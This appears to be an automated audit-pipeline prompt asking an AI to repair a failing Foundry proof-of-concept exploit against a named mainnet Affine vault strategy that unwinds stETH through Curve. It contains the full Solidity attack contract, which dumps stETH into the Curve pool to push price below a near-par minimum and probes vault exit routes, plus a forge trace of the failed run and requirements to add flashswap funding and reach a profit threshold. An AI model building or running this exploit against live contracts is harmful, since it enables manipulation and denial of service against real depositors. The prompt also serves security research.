You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Curve near-par minimum output plus swallowed divest reverts can permissionlessly DoS strategy exits
- claim: The strategy unwinds stETH through Curve with a near-par `min_dy` derived from the stETH input amount (`slippageBps` defaults to 10 bps), not from a live market quote. If the stETH/ETH pool moves beyond that threshold, Curve reverts. Vault withdrawals then silently convert that revert into a zero-asset divest because `AffineVault._divest()` catches all `strategy.divest()` failures and returns 0.
- impact: An attacker can front-run withdrawal, liquidation, rebalance, or strategy-removal transactions with a sufficiently large stETH->ETH trade, force the unwind swap to revert, and make the vault unable to source WETH from the strategy for that transaction. Organic stETH discounts can trigger the same failure mode, leaving capital temporarily stuck exactly when exits are needed.
- exploit_paths: ["Attacker or market movement pushes the stETH/ETH Curve execution price below the strategy's near-par `min_dy` threshold", "A vault withdrawal, liquidation, rebalance, or removal reaches `_endPosition()` or dec-leverage rebalancing and calls `CURVE.exchange(...)` with that stale threshold", "Curve reverts because actual ETH output is below `min_dy`", "`AffineVault._divest()` catches the revert and returns 0, so the vault cannot pull the requested WETH from the strategy"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IStrategyLike {
    function vault() external view returns (address);
    function asset() external view returns (address);
    function divest(uint256 amount) external returns (uint256);
}

interface ICurvePoolLike {
    function exchange(int128 x, int128 y, uint256 dx, uint256 min_dy) external returns (uint256);
    function get_dy(int128 i, int128 j, uint256 dx) external view returns (uint256);
}

contract FlawVerifier {
    address internal constant TARGET_STRATEGY = 0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142;
    address internal constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address internal constant CURVE = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;

    address internal _profitToken;
    uint256 internal _profitAmount;

    address public immutable strategy;
    address public discoveredVault;

    bool public executed;
    bool public strategyActiveInVault;
    bool public directDivestBlocked;
    bool public privilegedVaultExitBlocked;
    bool public privilegedRebalanceBlocked;
    bool public privilegedRemovalBlocked;
    bool public existingShareRouteAvailable;
    bool public curveManipulationAttempted;
    bool public curveQuoteBelowNearPar;

    uint256 public verifierShareBalance;
    uint256 public verifierStEthBalance;
    uint256 public curveEthReceived;
    uint256 public nearParMinDy;
    uint256 public quotedEthOutBeforeManipulation;
    uint256 public quotedEthOutAfterManipulation;

    bytes public directDivestRevertData;
    bytes public vaultWithdrawRevertData;
    bytes public vaultRebalanceRevertData;
    bytes public vaultRemoveRevertData;
    bytes public vaultStrategyInfoData;
    bytes public vaultShareBalanceData;
    bytes public vaultRedeemProbeData;

    constructor() {
        strategy = TARGET_STRATEGY;
        _profitToken = _safeAsset(TARGET_STRATEGY);
    }

    function executeOnOpportunity() external {
        if (executed) {
            _updateProfit();
            return;
        }

        executed = true;
        discoveredVault = IStrategyLike(strategy).vault();
        verifierStEthBalance = IERC20Like(STETH).balanceOf(address(this));

        _probeStrategyRegistration();
        _probeShareBalance();
        _probeDirectDivestAccess();
        _probePrivilegedVaultRoutes();
        _attemptExistingBalancePath();
        _updateProfit();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptExistingBalancePath() internal {
        // Vulnerable chain being preserved:
        // 1. attacker sells stETH -> ETH on Curve and worsens the stETH/ETH execution price;
        // 2. a withdrawal / liquidation / rebalance / removal path reaches strategy.divest(),
        //    which in LidoLevV3 eventually reaches _endPosition();
        // 3. _endPosition() calls CURVE.exchange(...) with a near-par min_dy derived from the
        //    stETH input amount instead of a live quote, so Curve can revert;
        // 4. AffineVault._divest() catches that strategy.divest() revert and returns 0.
        //
        // This verifier follows the required direct_or_existing_balance_first strategy:
        // only verifier-held stETH and any pre-existing vault shares on the fork are used.
        if (verifierShareBalance == 0) {
            return;
        }

        existingShareRouteAvailable = true;

        if (verifierStEthBalance > 0) {
            _attemptCurveDiscountWithVerifierBalance();
        }

        // If the verifier already owns live vault shares on the fork, redeeming them is the public
        // route most likely to hit the vault's internal withdrawal/liquidation flow and therefore the
        // AffineVault._divest() try/catch wrapper around strategy.divest().
        (bool ok, bytes memory data) = discoveredVault.call(
            abi.encodeWithSignature("redeem(uint256,address,address)", verifierShareBalance, address(this), address(this))
        );
        vaultRedeemProbeData = data;

        if (ok) {
            _updateProfit();
        }
    }

    function _attemptCurveDiscountWithVerifierBalance() internal {
        curveManipulationAttempted = true;

        nearParMinDy = _slippageDown(verifierStEthBalance, 10);
        quotedEthOutBeforeManipulation = _safeGetDy(verifierStEthBalance);
        if (quotedEthOutBeforeManipulation < nearParMinDy) {
            curveQuoteBelowNearPar = true;
        }

        // Same market action as the finding: sell stETH for ETH into the stETH/ETH Curve pool.
        // The verifier uses only fork-existing stETH already held by this contract; no balance injection.
        IERC20Like(STETH).approve(CURVE, verifierStEthBalance);
        try ICurvePoolLike(CURVE).exchange(int128(1), int128(0), verifierStEthBalance, 0) returns (
            uint256 ethReceived
        ) {
            curveEthReceived = ethReceived;
        } catch {}

        quotedEthOutAfterManipulation = _safeGetDy(verifierStEthBalance);
        if (quotedEthOutAfterManipulation < nearParMinDy) {
            curveQuoteBelowNearPar = true;
        }
    }

    function _probeDirectDivestAccess() internal {
        // A direct call from the verifier should not be the usable exploit path.
        // The real path is a vault-triggered strategy.divest() that later reaches _endPosition().
        (bool ok, bytes memory data) = strategy.call(abi.encodeWithSelector(IStrategyLike.divest.selector, 1));
        if (!ok) {
            directDivestBlocked = true;
            directDivestRevertData = data;
        }
    }

    function _probePrivilegedVaultRoutes() internal {
        bool ok;
        bytes memory data;

        // Publicly callable victim flows are share redemption and other organic vault exits.
        // These admin probes are recorded because the same internal sink is used:
        // withdrawFromStrategy()/rebalance()/removeStrategy() -> strategy.divest() -> _endPosition()
        // -> CURVE.exchange(...) revert -> AffineVault._divest() catches and returns 0.
        (ok, data) = discoveredVault.call(abi.encodeWithSignature("withdrawFromStrategy(address,uint256)", strategy, 1));
        if (!ok) {
            privilegedVaultExitBlocked = true;
            vaultWithdrawRevertData = data;
        }

        (ok, data) = discoveredVault.call(abi.encodeWithSignature("rebalance()"));
        if (!ok) {
            privilegedRebalanceBlocked = true;
            vaultRebalanceRevertData = data;
        }

        (ok, data) = discoveredVault.call(abi.encodeWithSignature("removeStrategy(address)", strategy));
        if (!ok) {
            privilegedRemovalBlocked = true;
            vaultRemoveRevertData = data;
        }
    }

    function _updateProfit() internal {
        address token = _profitToken;
        if (token == address(0)) {
            _profitAmount = address(this).balance;
        } else {
            _profitAmount = IERC20Like(token).balanceOf(address(this));
        }
    }

    function _safeAsset(address target) internal view returns (address assetToken) {
        (bool ok, bytes memory data) = target.staticcall(abi.encodeWithSignature("asset()"));
        if (ok && data.length >= 32) {
            assetToken = abi.decode(data, (address));
        }
    }

    function _probeStrategyRegistration() internal {
        (bool ok, bytes memory data) =
            discoveredVault.staticcall(abi.encodeWithSignature("strategies(address)", strategy));
        vaultStrategyInfoData = data;

        if (ok && data.length >= 96) {
            (bool isActive,,) = abi.decode(data, (bool, uint16, uint232));
            strategyActiveInVault = isActive;
        }
    }

    function _probeShareBalance() internal {
        (bool ok, bytes memory data) =
            discoveredVault.staticcall(abi.encodeWithSignature("balanceOf(address)", address(this)));
        vaultShareBalanceData = data;

        if (ok && data.length >= 32) {
            verifierShareBalance = abi.decode(data, (uint256));
        }
    }

    function _safeGetDy(uint256 amount) internal view returns (uint256 quotedOut) {
        try ICurvePoolLike(CURVE).get_dy(int128(1), int128(0), amount) returns (uint256 out) {
            quotedOut = out;
        } catch {}
    }

    function _slippageDown(uint256 amount, uint256 slippageBps) internal pure returns (uint256) {
        return (amount * (10_000 - slippageBps) + 9_999) / 10_000;
    }

    receive() external payable {}
}

```

forge stdout (tail):
```
257BecdB
    │   ├─ [33852] 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [8263] 0xb8FFC3Cd6e7Cf5a098A1c92F48009765B24088Dc::be00bbd8(f1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320)
    │   │   │   ├─ [2820] 0x2b33CF282f867A7FF693A66e11B0FcC5552e4425::be00bbd8(f1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb
    │   │   │   └─ ← [Return] 0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb
    │   │   ├─ [14972] 0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [8031] 0x1196B60c9ceFBF02C9a3960883213f47257BecdB::39ebf823(000000000000000000000000cd6ca2f0d0c182c5049d9a1f65cde51a706ae142) [staticcall]
    │   │   ├─ [3127] 0xed1E0d11b8EF08dfa7c03e5eA3B74B6A428D81DC::39ebf823(000000000000000000000000cd6ca2f0d0c182c5049d9a1f65cde51a706ae142) [delegatecall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000271000000000000000000000000000000000000000000000000228c6bb223a967016
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000271000000000000000000000000000000000000000000000000228c6bb223a967016
    │   ├─ [3843] 0x1196B60c9ceFBF02C9a3960883213f47257BecdB::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [3445] 0xed1E0d11b8EF08dfa7c03e5eA3B74B6A428D81DC::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [773] 0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142::divest(1)
    │   │   └─ ← [Revert] BS: only vault
    │   ├─ [33908] 0x1196B60c9ceFBF02C9a3960883213f47257BecdB::b53d0958(000000000000000000000000cd6ca2f0d0c182c5049d9a1f65cde51a706ae1420000000000000000000000000000000000000000000000000000000000000001)
    │   │   ├─ [33470] 0xed1E0d11b8EF08dfa7c03e5eA3B74B6A428D81DC::b53d0958(000000000000000000000000cd6ca2f0d0c182c5049d9a1f65cde51a706ae1420000000000000000000000000000000000000000000000000000000000000001) [delegatecall]
    │   │   │   └─ ← [Revert] AccessControl: account 0x5615deb798bb3e4dfa0139dfa1b3d433cc23b72f is missing role 0x27e3e4d29d60af3ae6456513164bb5db737d6fc8610aa36ad458736c9efb884c
    │   │   └─ ← [Revert] AccessControl: account 0x5615deb798bb3e4dfa0139dfa1b3d433cc23b72f is missing role 0x27e3e4d29d60af3ae6456513164bb5db737d6fc8610aa36ad458736c9efb884c
    │   ├─ [33421] 0x1196B60c9ceFBF02C9a3960883213f47257BecdB::7d7c2a1c()
    │   │   ├─ [32989] 0xed1E0d11b8EF08dfa7c03e5eA3B74B6A428D81DC::7d7c2a1c() [delegatecall]
    │   │   │   └─ ← [Revert] AccessControl: account 0x5615deb798bb3e4dfa0139dfa1b3d433cc23b72f is missing role 0x27e3e4d29d60af3ae6456513164bb5db737d6fc8610aa36ad458736c9efb884c
    │   │   └─ ← [Revert] AccessControl: account 0x5615deb798bb3e4dfa0139dfa1b3d433cc23b72f is missing role 0x27e3e4d29d60af3ae6456513164bb5db737d6fc8610aa36ad458736c9efb884c
    │   ├─ [3173] 0x1196B60c9ceFBF02C9a3960883213f47257BecdB::175188e8(000000000000000000000000cd6ca2f0d0c182c5049d9a1f65cde51a706ae142)
    │   │   ├─ [2762] 0xed1E0d11b8EF08dfa7c03e5eA3B74B6A428D81DC::175188e8(000000000000000000000000cd6ca2f0d0c182c5049d9a1f65cde51a706ae142) [delegatecall]
    │   │   │   └─ ← [Revert] Only Governance.
    │   │   └─ ← [Revert] Only Governance.
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [411] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [498] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 19132934 [1.913e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xed1E0d11b8EF08dfa7c03e5eA3B74B6A428D81DC
  at 0x1196B60c9ceFBF02C9a3960883213f47257BecdB
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 12.84s (2.07s CPU time)

Ran 1 test suite in 12.84s (12.84s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 861303)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
